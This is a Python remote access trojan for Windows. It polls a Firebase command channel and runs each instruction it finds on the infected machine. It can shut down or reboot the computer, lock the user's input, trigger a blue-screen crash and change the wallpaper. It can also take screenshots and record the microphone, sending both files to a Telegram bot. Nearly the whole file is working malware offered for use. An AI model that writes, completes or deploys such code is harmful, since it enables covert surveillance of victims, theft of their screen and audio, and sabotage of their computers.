import requests
import subprocess
import ctypes
import time
import threading
from PIL import ImageGrab, Image
import os
import sounddevice as sd
from scipy.io.wavfile import write

TOKEN = " token her"
CHAT_ID = "5090097134"
FIREBASE_URL = "https://rat-vm-11c62-default-rtdb.firebaseio.com/commands.json"
CHECK_INTERVAL = 3
executed_commands = set()

def shutdown():
    subprocess.run("shutdown /s /t 1", shell=True)

def restart():
    subprocess.run("shutdown /r /t 1", shell=True)

def winlocker():
    def lock_input():
        user32 = ctypes.WinDLL("user32")
        user32.BlockInput(True)
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        time.sleep(60)
        user32.BlockInput(False)
    threading.Thread(target=lock_input).start()

def bsod():
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
    except:
        pass

def send_photo(file_path):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    with open(file_path, "rb") as photo:
        files = {"photo": photo}
        data = {"chat_id": CHAT_ID}
        requests.post(url, files=files, data=data)

def take_screenshot_and_send():
    img = ImageGrab.grab()
    img.save("screenshot.png")
    send_photo("screenshot.png")

def change_wallpaper_to_red():
    image_path = os.path.join(os.getcwd(), "red_wallpaper.bmp")
    red_img = Image.new("RGB", (1920, 1080), (255, 0, 0))
    red_img.save(image_path, "BMP")
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)

def record_and_send_audio():
    fs = 44100
    duration = 5
    filename = "mic_recording.wav"
    recording = sd.rec(int(duration * fs), samplerate=fs, channels=1)
    sd.wait()
    write(filename, fs, recording)

    url = f"https://api.telegram.org/bot{TOKEN}/sendAudio"
    with open(filename, "rb") as audio:
        requests.post(url, data={"chat_id": CHAT_ID}, files={"audio": audio})

def run_command(cmd):
    if cmd == "1":
        shutdown()
    elif cmd == "2":
        restart()
    elif cmd == "3":
        winlocker()
    elif cmd == "4":
        bsod()
    elif cmd == "5":
        pass  # Placeholder للكاميرا
    elif cmd == "6":
        take_screenshot_and_send()
    elif cmd == "7":
        change_wallpaper_to_red()
    elif cmd == "8":
        record_and_send_audio()

def watch_commands():
    global executed_commands
    try:
        res = requests.get(FIREBASE_URL).json()
        if res:
            executed_commands = set(res.keys())
        else:
            executed_commands = set()
    except:
        executed_commands = set()

    while True:
        try:
            res = requests.get(FIREBASE_URL).json()
            if res:
                for key, item in res.items():
                    cmd = item.get("command")
                    if key not in executed_commands and cmd:
                        run_command(cmd)
                        executed_commands.add(key)
        except:
            pass
        time.sleep(CHECK_INTERVAL)

if __name__ == "__main__":
    watch_commands()